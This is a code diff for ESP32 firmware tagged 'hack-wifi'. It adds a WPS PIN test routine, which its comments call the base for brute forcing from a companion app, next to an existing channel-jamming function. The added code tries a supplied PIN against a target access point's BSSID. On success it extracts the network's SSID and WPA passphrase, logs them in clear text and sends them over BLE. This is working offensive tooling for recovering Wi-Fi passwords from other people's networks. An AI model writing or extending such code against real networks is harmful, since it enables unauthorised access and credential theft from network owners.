@@ -8,8 +8,11 @@
 #include "esp_log.h"
 #include "esp_wifi.h"
 #include "esp_timer.h"
+#include "esp_event.h"
+#include "esp_wps.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
+#include "freertos/event_groups.h"
 
 static const char *TAG = "hack-wifi";
 
@@ -371,6 +374,207 @@ esp_err_t hacking_wifi_channel_jam_stop(void)
 {
     if (!s_busy) return ESP_ERR_INVALID_STATE;
     s_jam_stop = true;
+    return ESP_OK;
+}
+
+// ----------------------------------------------------------------------
+// WPS PIN test (1 attempt) — base pra brute force lado-app
+// ----------------------------------------------------------------------
+
+#define WPS_BIT_DONE   (1 << 0)
+
+typedef struct {
+    uint8_t  bssid[6];
+    char     pin[9]; // 8 chars + NUL
+    uint16_t timeout_sec;
+} wps_job_t;
+
+static EventGroupHandle_t s_wps_evg = NULL;
+static volatile int s_wps_event_id = -1;
+static wifi_event_sta_wps_er_success_t s_wps_success = {0};
+static wifi_event_sta_wps_fail_reason_t s_wps_fail_reason = WPS_FAIL_REASON_NORMAL;
+static esp_event_handler_instance_t s_wps_handler_instance = NULL;
+
+static void wps_event_handler(void *arg, esp_event_base_t base,
+                               int32_t id, void *data)
+{
+    (void)arg;
+    if (base != WIFI_EVENT) return;
+    switch (id) {
+    case WIFI_EVENT_STA_WPS_ER_SUCCESS:
+        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_SUCCESS;
+        if (data) memcpy(&s_wps_success, data, sizeof(s_wps_success));
+        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
+        break;
+    case WIFI_EVENT_STA_WPS_ER_FAILED:
+        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_FAILED;
+        s_wps_fail_reason = data ? *(wifi_event_sta_wps_fail_reason_t *)data
+                                  : WPS_FAIL_REASON_NORMAL;
+        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
+        break;
+    case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
+        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_TIMEOUT;
+        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
+        break;
+    case WIFI_EVENT_STA_WPS_ER_PBC_OVERLAP:
+        s_wps_event_id = WIFI_EVENT_STA_WPS_ER_PBC_OVERLAP;
+        if (s_wps_evg) xEventGroupSetBits(s_wps_evg, WPS_BIT_DONE);
+        break;
+    default:
+        break;
+    }
+}
+
+// status no TLV: 0=success, 1=failed (com fail_reason), 2=timeout, 3=pbc_overlap, 4=internal_error
+static void emit_wps_done(const uint8_t bssid[6], uint8_t status,
+                           uint8_t fail_reason,
+                           const char *ssid, size_t ssid_len,
+                           const char *psk, size_t psk_len)
+{
+    uint8_t payload[6 + 1 + 1 + 1 + 32 + 1 + 64];
+    size_t off = 0;
+    memcpy(&payload[off], bssid, 6); off += 6;
+    payload[off++] = status;
+    payload[off++] = fail_reason;
+    if (ssid_len > 32) ssid_len = 32;
+    payload[off++] = (uint8_t)ssid_len;
+    if (ssid_len) { memcpy(&payload[off], ssid, ssid_len); off += ssid_len; }
+    if (psk_len > 64) psk_len = 64;
+    payload[off++] = (uint8_t)psk_len;
+    if (psk_len) { memcpy(&payload[off], psk, psk_len); off += psk_len; }
+
+    uint8_t out[TLV_MAX_FRAME_SIZE];
+    int total = tlv_encode(out, sizeof(out),
+                           TLV_MSG_WPS_TEST_DONE, s_seq++,
+                           payload, off);
+    if (total > 0) transport_ble_send_stream(out, (size_t)total);
+}
+
+static void wps_test_task(void *arg)
+{
+    wps_job_t *job = (wps_job_t *)arg;
+    uint8_t status = 4; // internal error por default
+    uint8_t fail_reason = 0;
+    const char *ssid = "";
+    size_t ssid_len = 0;
+    const char *psk = "";
+    size_t psk_len = 0;
+
+    s_wps_evg = xEventGroupCreate();
+    if (!s_wps_evg) {
+        ESP_LOGE(TAG, "wps: event group alloc failed");
+        goto emit;
+    }
+    s_wps_event_id = -1;
+    memset(&s_wps_success, 0, sizeof(s_wps_success));
+
+    esp_err_t err = esp_event_handler_instance_register(
+        WIFI_EVENT, ESP_EVENT_ANY_ID, &wps_event_handler,
+        NULL, &s_wps_handler_instance);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "wps: event register rc=%s", esp_err_to_name(err));
+        goto cleanup_evg;
+    }
+
+    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
+    strncpy(cfg.pin, job->pin, sizeof(cfg.pin) - 1);
+    cfg.pin[sizeof(cfg.pin) - 1] = 0;
+
+    err = esp_wifi_wps_enable(&cfg);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "wps_enable rc=%s", esp_err_to_name(err));
+        goto cleanup_handler;
+    }
+    err = esp_wifi_wps_start(0);
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "wps_start rc=%s", esp_err_to_name(err));
+        esp_wifi_wps_disable();
+        goto cleanup_handler;
+    }
+
+    EventBits_t bits = xEventGroupWaitBits(s_wps_evg, WPS_BIT_DONE,
+                                            pdTRUE, pdFALSE,
+                                            pdMS_TO_TICKS(job->timeout_sec * 1000));
+    if (!(bits & WPS_BIT_DONE)) {
+        ESP_LOGW(TAG, "wps: timeout no event group");
+        status = 2;
+    } else {
+        switch (s_wps_event_id) {
+        case WIFI_EVENT_STA_WPS_ER_SUCCESS:
+            status = 0;
+            // Pega 1ª credencial (struct anônimo com ssid + passphrase)
+            if (s_wps_success.ap_cred_cnt > 0) {
+                ssid = (const char *)s_wps_success.ap_cred[0].ssid;
+                ssid_len = strnlen(ssid, MAX_SSID_LEN);
+                psk = (const char *)s_wps_success.ap_cred[0].passphrase;
+                psk_len = strnlen(psk, MAX_PASSPHRASE_LEN);
+                ESP_LOGI(TAG, "wps SUCCESS: ssid='%.*s' psk='%.*s'",
+                         (int)ssid_len, ssid, (int)psk_len, psk);
+            }
+            break;
+        case WIFI_EVENT_STA_WPS_ER_FAILED:
+            status = 1;
+            fail_reason = (uint8_t)s_wps_fail_reason;
+            ESP_LOGI(TAG, "wps FAILED reason=%u", fail_reason);
+            break;
+        case WIFI_EVENT_STA_WPS_ER_TIMEOUT:
+            status = 2;
+            ESP_LOGI(TAG, "wps TIMEOUT");
+            break;
+        case WIFI_EVENT_STA_WPS_ER_PBC_OVERLAP:
+            status = 3;
+            ESP_LOGI(TAG, "wps PBC_OVERLAP");
+            break;
+        }
+    }
+
+    esp_wifi_wps_disable();
+
+cleanup_handler:
+    esp_event_handler_instance_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID,
+                                           s_wps_handler_instance);
+    s_wps_handler_instance = NULL;
+cleanup_evg:
+    vEventGroupDelete(s_wps_evg);
+    s_wps_evg = NULL;
+emit:
+    emit_wps_done(job->bssid, status, fail_reason,
+                  ssid, ssid_len, psk, psk_len);
+
+    free(job);
+    s_task = NULL;
+    s_busy = false;
+    vTaskDelete(NULL);
+}
+
+esp_err_t hacking_wifi_wps_pin_test(const uint8_t bssid[6],
+                                    const char *pin,
+                                    uint16_t timeout_sec)
+{
+    if (!bssid || !pin) return ESP_ERR_INVALID_ARG;
+    if (strlen(pin) != 8) return ESP_ERR_INVALID_ARG;
+    if (s_busy) return ESP_ERR_INVALID_STATE;
+
+    if (timeout_sec == 0)   timeout_sec = 60;
+    if (timeout_sec < 15)   timeout_sec = 15;
+    if (timeout_sec > 120)  timeout_sec = 120;
+
+    wps_job_t *job = calloc(1, sizeof(*job));
+    if (!job) return ESP_ERR_NO_MEM;
+    memcpy(job->bssid, bssid, 6);
+    memcpy(job->pin, pin, 8);
+    job->pin[8] = 0;
+    job->timeout_sec = timeout_sec;
+
+    s_busy = true;
+    if (xTaskCreate(wps_test_task, "wps_test", 6144, job, 5, &s_task) != pdPASS) {
+        free(job);
+        s_busy = false;
+        return ESP_ERR_NO_MEM;
+    }
+    ESP_LOGI(TAG, "wps_pin_test: bssid=%02x:%02x:%02x:%02x:%02x:%02x pin=%s timeout=%us",
+             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+             job->pin, (unsigned)timeout_sec);
     return ESP_OK;
 }
 
